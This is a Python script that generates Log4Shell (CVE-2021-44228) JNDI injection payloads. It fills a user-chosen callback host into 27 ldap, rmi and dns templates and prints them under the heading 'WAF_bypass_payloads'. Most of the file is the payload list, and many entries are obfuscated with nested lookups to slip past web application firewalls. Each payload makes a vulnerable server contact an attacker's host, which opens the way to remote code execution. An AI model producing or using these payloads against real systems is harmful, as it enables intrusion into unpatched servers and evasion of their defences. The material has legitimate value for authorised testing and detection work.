#!/usr/bin/env python3
# coding=utf-8
# ******************************************************************
# log4j-paylaod generator: A generic payload generator for Apache log4j RCE CVE-2021-44228
# Author:
# Yesspider (Y3$_$pider)
# 
# ******************************************************************


import colorama
from colorama import Fore, Back, Style
colorama.init(autoreset=True)



callback_host = str(input('[+] Enter callback_host [localhost:1389] : '))
#user input to replace callback_host

random = str(input('[+] Enter random_string [yesspider] : '))
#user input to replace random_string

payload_list = ["${jndi:ldap://{{callback_host}}/{{random}}}",
	"${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
	"${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
	"${jndi:rmi://{{callback_host}}/{{random}}}",
	"${jndi:rmi://{{callback_host}}}/",
	"${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
	"${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
	"${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
	"${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
	"${jndi:dns://{{callback_host}}/{{random}}}",
	"${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
	"${jndi:dns://{{callback_host}}}",
	"${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
	"${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
	"${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
	"${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
	"${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
	"${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
	"${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
	"${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
	"${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
	"${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
	"${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
	"${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}",
	"${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",
	"${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
	"${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"]


# logo , auther_name and tool discription

print ()

print (f"{Fore.CYAN}******************************************************************")
print ("log4j-paylaod generator: A payload generator for Apache log4j RCE CVE-2021-44228")
print ('\033[31m' + "Author:")
print ("Yesspider")
print ("")
print(f"{Fore.YELLOW} __      __                                             __        __                     ")
print(f"{Fore.YELLOW}/  \    /  |                                           /  |      /  |                    ")
print(f"{Fore.YELLOW}$$  \  /$$/______    _______         _______   ______  $$/   ____$$ |  ______    ______  ")
print(f"{Fore.YELLOW} $$  \/$$//      \  /       |       /       | /      \ /  | /    $$ | /      \  /      \ ")
print(f"{Fore.YELLOW}  $$  $$//$$$$$$  |/$$$$$$$/       /$$$$$$$/ /$$$$$$  |$$ |/$$$$$$$ |/$$$$$$  |/$$$$$$  |")
print(f"{Fore.YELLOW}   $$$$/ $$    $$ |$$      \       $$      \ $$ |  $$ |$$ |$$ |  $$ |$$    $$ |$$ |  $$/ ")
print(f"{Fore.YELLOW}    $$ | $$$$$$$$/  $$$$$$  |       $$$$$$  |$$ |__$$ |$$ |$$ \__$$ |$$$$$$$$/ $$ |      ")
print(f"{Fore.YELLOW}    $$ | $$       |/     $$/       /     $$/ $$    $$/ $$ |$$    $$ |$$       |$$ |      ")
print(f"{Fore.YELLOW}    $$/   $$$$$$$/ $$$$$$$/        $$$$$$$/  $$$$$$$/  $$/  $$$$$$$/  $$$$$$$/ $$/       ")
print(f"{Fore.YELLOW}                                             $$ |                                        ")
print(f"{Fore.YELLOW}                                             $$ |                                        ")
print(f"{Fore.YELLOW}                                            $$/                                          ") 
print (f"{Fore.CYAN}******************************************************************")

print ()

print (f"{Fore.CYAN}Callback_Host  = ", callback_host)
print (f"{Fore.CYAN}Random_String  = ", random)

print ()
print ('\033[31m' + "log4j_WAF_bypass_payloads... ")
print ()




#replace host and random string 

for i in payload_list:
    new_payload = i.replace("{{callback_host}}", callback_host);
    new_payload = new_payload.replace("{{random}}", random);
    # print the final paylaod list
    print (new_payload)

print ()
